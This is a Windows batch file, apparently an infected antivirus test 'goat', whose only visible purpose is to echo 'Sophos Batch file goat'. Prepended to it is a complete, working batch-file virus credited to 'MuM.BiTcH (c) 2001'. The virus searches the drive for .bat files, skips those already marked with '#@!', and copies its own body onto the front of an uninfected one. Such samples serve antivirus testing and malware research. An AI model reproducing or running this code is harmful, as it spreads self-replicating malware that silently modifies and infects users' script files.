@echo off
rem #@!begin
rem created by MuM.BiTcH (c) 2001
if exist "temp.$$$" (del temp.$$$)
if exist "body.$$$" (del body.$$$)
for /r \ %%a in (*.bat) do echo %%a>>temp.$$$
findstr /m /f:temp.$$$ /c:"#@!" >temp2.$$$
findstr /v /l /g:temp2.$$$ temp.$$$ >temp3.$$$
for /f "delims=" %%i in (%0) do (
  if "%%i" NEQ "@rem #@!end" (
    if not defined meof (echo %%i>>body.$$$)
  ) else (
    if not defined meof (echo %%i>>body.$$$)
    set meof=yes
  )
)
for /f "delims=" %%i in (temp3.$$$) do (
  if not defined minf (
    copy /b body.$$$ + %%i inf.$$$ >nul
    del %%i
    move inf.$$$ %%i
  )
  set minf=yes
)
if exist "temp.$$$" (del temp.$$$)
if exist "temp2.$$$" (del temp2.$$$)
if exist "temp3.$$$" (del temp3.$$$)
if exist "body.$$$" (del body.$$$)
if exist "inf.$$$" (del inf.$$$)
echo on
@rem #@!end
@echo off
echo "Sophos Batch file goat"